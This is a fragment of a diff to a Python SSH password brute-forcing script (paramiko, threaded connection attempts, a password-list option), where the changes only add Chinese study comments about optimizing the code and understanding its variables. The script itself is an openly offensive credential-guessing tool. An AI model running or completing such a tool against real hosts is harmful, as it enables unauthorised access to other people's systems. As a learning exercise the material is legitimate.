@@ -8,13 +8,13 @@ connection_lock = threading.BoundedSemaphore(value=max_connections)
 found = False
 fails = 0
 
-def connect(host, user, password, release):
+def connect(host, user, password, release): # 代码存在一些问题需要优化
     global found, fails
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(host,22,user,password,timeout=5)
-        stdin, stdout, stderr = ssh.exec_command('id')
+        stdin, stdout, stderr = ssh.exec_command('id') #分析三个std变量是什么
         print("[+] Password Found: {}".format(password))
         found = True
         ssh.close()
@@ -30,7 +30,7 @@ def connect(host, user, password, release):
         if release:
             connection_lock.release()
 
-def main():
+def main(): # 入口有一些问题需要优化。
     parser = optparse.OptionParser("usage %prog -H <target host> -u <user> -F <password list>")
     parser.add_option("-H", dest="target_host", type=str, help="specifiy target host")
     parser.add_option("-F", dest="password_file", type=str, help="specifiy password file")
